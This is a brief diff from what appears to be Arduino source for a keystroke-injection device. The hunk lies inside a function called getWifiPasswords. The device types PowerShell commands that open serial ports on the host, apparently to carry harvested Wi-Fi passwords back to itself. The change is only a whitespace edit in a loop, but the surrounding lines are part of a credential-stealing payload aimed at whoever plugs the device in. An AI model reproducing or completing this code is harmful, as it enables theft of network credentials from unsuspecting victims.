@@ -30,7 +30,7 @@ void getWifiPasswords(){
 
   //Write to Serial Port
   //Arduino Needs to be within the first 10 COM ports
-  for(int x =0 ; x < comPorts; x++){
+  for(int x =0 ; x <comPorts; x++){
     Keyboard.print("$test = new-Object System.IO.Ports.SerialPort COM");
     Keyboard.print(x);
     Keyboard.print(",9600,None,8,one");
